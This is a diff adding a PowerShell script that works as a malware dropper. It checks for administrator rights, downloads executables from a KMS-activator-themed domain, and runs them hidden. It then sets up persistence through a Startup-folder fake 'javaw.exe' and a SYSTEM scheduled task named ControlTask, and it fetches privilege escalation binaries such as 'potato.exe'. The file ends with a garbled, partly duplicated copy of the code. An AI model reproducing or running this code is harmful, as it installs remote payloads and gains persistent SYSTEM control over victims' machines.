@@ -1,0 +1,47 @@
+
+invoke-expression "     
+$os = [environment]::OSVersion.Version
+$privilege = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match \"S-1-5-32-544\")
+$arch = $env:PROCESSOR_ARCHITECTURE
+$CheckSleep = 20
+$dev_mode = $false
+if($(Test-Path \".dev\")) {
+$dev_mode = $true
+\tWrite-Warning \"DevelMode!\"
+\t
+$base_url = \"http://localhost:8000\"
+} else {
+\t
+$base_url = \"https://kmsauto.us/someone\" }
+function nopriv {
+\tif(!$(Test-Path \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\")) \t{
+\t\tmkdir \"
+$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\t}
+(New-Object System.Net.WebClient).DownloadFile(\"$base_url/l.exe\", \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\javaw.exe\") 
+\tStart-Process \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\javaw.exe\" -WindowStyle Hidden}
+function StartAndExec2 \tparam(\t\t[Parameter()]\t\t[string]$url\t)\t\t
+$FileName = -join ((65..90) | Get-Random -Count 10 | % {[char]$_})\t\t$FilePath = \"$env:temp\\$FileName.exe\"
+\t\t(New-Object System.net.WebClient).DownloadFile(\"$url\",$FilePath)\t\tStart-Sleep 5
+\t\tif(Test-Path $FilePath) \t\t{\t\t\t
+$procId = Start-Process $FilePath -PassThru -WindowStyle Hidden\t\t\tWait-Process $procId.Id -ErrorAction SilentlyContinue\t\t\tStart-Sleep 
+$CheckSleep\t\t\tif(Test-Path \"$env:ProgramData\\Microsoft\\javaw.exe\")\t\t\t{\t\t\t\tStop-Process  $pid -Confirm:$false -Force\t\t\t}\t\t}}
+if(!$privilege){\t$urlArray = @()\tif($os.Major -lt 10)\t{\t\t$urlArray += ,\"$base_url/potato.exe\"\t} else\t{\t\t
+$urlArray += ,\"$base_url/ghost.exe\"\t\t
+$urlArray += ,\"$base_url/spooler.exe\"\t}\tForEach(
+$url in $urlArray)\t{\t\ttry {\t\t\tStartAndExec2 -url 
+$url\t\t} catch {}\t}
+\tif(!$dev_mode)\t{\t\tnopriv\t}
+} elseif ($privilege){
+\tGet-Process | Where-Object {$_.Path -eq \"$env:programdata\\Microsoft\\javaw.exe\" -or $_.Path -eq \"$env:programdata\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\javaw.exe\"} | foreach {
+\t\tStop-Process -id $_.Id -Confirm:$false -Force\t}
+(New-Object System.Net.WebClient).DownloadFile(\"$base_url/l.exe\", \"$env:programdata\\Microsoft\\javaw.exe\")
+\tStart-Process cmd.exe -ArgumentList \"/c schtasks  /create /TN \\Microsoft\\Windows\\ControlTask /TR `\"C:\\ProgramData\\Microsoft\\javaw.exe`\" /ST 00:00 /SC once /DU 59994 /RI 1 /F /RL HIGHEST /RU SYSTEM\" -Wait  -NoNewWindow\tStart-Process cmd.exe \"/c schtasks /TN \\Microsoft\\Windows\\ControlTask /run\" -Wait -NoNewWindow}   
+"$os = ([environment]::osversion).version
+$privilege = [bool]([system.security.principal.windowsidentity]::getcurrent()).groups -match "S-1-5-32-544"
+$arch = $env:processor_architecture
+$checksleep = 20
+$dev_mode = $false
+if (test-path ".dev") {{
+function nopriv {{{(new-object system.net.webclient).downloadfile("$base_url/l.exe", "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\javaw.exe")start-process "
+$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\javaw.exe" -windowstyle hidden},{}}}
+}
